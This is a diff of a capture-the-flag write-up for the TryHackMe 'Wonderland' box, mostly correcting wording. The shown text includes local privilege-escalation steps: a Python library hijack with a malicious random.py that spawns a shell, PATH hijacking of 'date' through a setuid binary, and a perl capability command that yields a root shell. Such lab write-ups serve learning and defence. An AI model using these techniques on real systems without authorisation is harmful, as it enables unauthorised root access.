@@ -11,7 +11,7 @@ this is a medium rated machine from wonderland series, which happens to be the f
 
 ### Reconnaissance
 
-first thing I did is adding the box's ip to my hosts file
+first thing I did is adding the box ip to my hosts file
 ```bash
 echo "10.10.114.141 ctf.thm" | sudo tee -a /etc/hosts
 ```
@@ -95,7 +95,7 @@ examining the source code showed what appeared to be the ssh credentiels for the
 
 ![ssh creds](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/wonder/creds.png)
 
-### \[hacker voice\]I'm in
+### \[hacker voice\] I'm in
 
 once I got on the box, I found a file called `root.txt` which has the final flag we have to find, this seemed a bit weird since I haven't found the `user.txt` flag yet.
 
@@ -106,6 +106,7 @@ import random
 poem = """The sun was shining on the sea,
 Shining with all his mig
 ...
+"""
 
 for i in range(10):
     line = random.choice(poem.split("\n"))
@@ -154,7 +155,7 @@ I took a moment to find the `user.txt` flag, I ran couple `find` commands but no
 
 ![upside down](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/wonder/upside_down.png)
 
-I went to check the root directory and surprise surprise, we have execute permissions. this means we can't list the files on `/root` but we can run commands or read files from there as long as we know the files names, lucky for me, tryhackme tells me to `Obtain the flag in user.txt`
+I went to check the root directory and surprise surprise, we have execute permissions on it. this means we can't list the files on `/root` but we can run commands or read files from there as long as we know the names of the files, lucky for me, tryhackme tells me to `Obtain the flag in user.txt`
 
 ```bash
 alice@wonderland:~$ ls -lhd /root
@@ -175,7 +176,7 @@ alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
 hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
 rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
 ```
-I already know I can execute a script as the user `rabbit` but didn't know that to do with that information, and with of lot of time passed doing other enumerations and I decided to peak at a write up, but hey let's keep that between me and you
+I already know I can execute a script as the user `rabbit` but didn't know that to do with that information, and with of lot of time passed enumerationng, I decided to peak at a write up, but hey let's keep that between me and you
 
 doing so I've learned 2 new things
 <li>
@@ -183,7 +184,7 @@ doing so I've learned 2 new things
     <ol> python tries to find imported libraries in the current working directory before looking for them somewhere else, knowing this we can make a malicious `random.py` to elevate priveleges </ol>
 </li>
 
-of course, it's so obvious, *if* I had known those info before
+of course, it's so obvious, *if* I had known those informations before
 
 ```bash
 alice@wonderland:~$ echo 'import pty;pty.spawn("/bin/bash")' > random.py
@@ -196,7 +197,7 @@ rabbit@wonderland:~$
 
 ### escalating to hatter
 
-checking out what in rabbit's home directory I found a and elf executable with setuid bit set, this was plesant to see as my reverese engineering skills are slightly better than my web hacking skills
+checking out what in rabbit's home directory I found a 64 bit elf executable with setuid bit set, this was pleasant to see as my reverese engineering skills are slightly better than my web hacking skills
 
 ```bash
 rabbit@wonderland:~$ cd ../rabbit/
@@ -221,7 +222,7 @@ TLDR; it sets the effective user and group id to 1003, which belong the `hatter`
 ```bash
 /bin/echo -n \'Probably by \' && date --date=\'next hour\' -R
 ```
-you can see that `date` wasn't invoked with its absolute path, knowing this information we can make a fake `date` executable then alter the `$PATH` variable so the teaParty executee our version of `date`
+you can see that `date` wasn't invoked with its absolute path, knowing this information we can make a fake `date` executable then alter the `$PATH` variable so the teaParty executes our version of the said executable
 
 ```bash
 rabbit@wonderland:/home/rabbit$ cd ../rabbit/
@@ -238,8 +239,8 @@ hatter@wonderland:/home/rabbit$
 
 ### gaining root privileges
 
-`hatter`'s home directory didn't have anything useful for us, there was a file there that conatains the some kind of password, I tried using it to login as `root`
-without any sucess, and I after a while it turned out to be `hatter`'s ssh credentiels, it didn't do us any good as `hatter` didn't have the permission to execute commands with sudo
+`hatter`'s home directory didn't have anything useful for us, there was a file there that contains some kind of password, I tried using it to login as `root`
+without any success, after a while it turned out to be `hatter`'s ssh credentiels, it didn't do me any good as `hatter` didn't have the permission to execute commands with sudo
 
 ```bash
 hatter@wonderland:/home/rabbit$ cd ../hatter/
@@ -253,9 +254,9 @@ Sorry, user hatter may not run sudo on wonderland.
 hatter@wonderland:/home/hatter$
 ```
 
-at this point I've enumerated for quite some time again but I hit a wall for the second time, couple hours passsed and I've decided to peak at a write up again, I found out that I should look for files with `capabilities(7)`, again something little obvious. but I probably wouldn't have known it since even tho I always heard of such thing, I never interacted with it
+at this point I've been enumerating for quite some time but I hit a wall for the second time, couple hours passsed and I've decided to peak at a write up again, I found out that I should look for files with `capabilities(7)`, again something little obvious. but I probably wouldn't have known it since even tho I always heard of such thing, I never interacted with it or took the time to be familliar with it
 
-after some diging around I found a utlity called `getccap` that displays files with special capabilites, you can read it's man page to know more about it
+after some ing around I found a utlity called `getccap` that can display files with special capabilites, you can read it's man page to know more about it
 
 ```bash
 hatter@wonderland:/home/hatter$ getcap -r / 2> /dev/null 
@@ -270,13 +271,12 @@ hatter@wonderland:/home/hatter$ ls -lh /usr/bin/perl5.26.1 /usr/bin/perl
 after looking up those executables in [gtfo bins](https://gtfobins.github.io/) I found a command I can use to spawn a root shell, and it worked on both binaries!
 
 ```bash
-hatter@wonderland:/home/hatter$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-bash: /usr/bin/perl: Permission denied
 hatter@wonderland:~$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 # whoami
 root
 # 
 ```
+
 ### I'm groot
 
 now we're root we can just get the `root.txt` flag
@@ -289,4 +289,4 @@ thm{REDACTED}
 
 ### conclusion
 
-wonderland was a really nice box, it had me banging my head against the wall but I learned couple new tricks that'll come handy in the future, I hope next time there would be less to no peaking at all
+wonderland was a really nice box, it had me banging my head against the wall but I learned couple new tricks that'll come handy in the future, I hoe you did as well, hopefully next time there would be less to no peaking at all
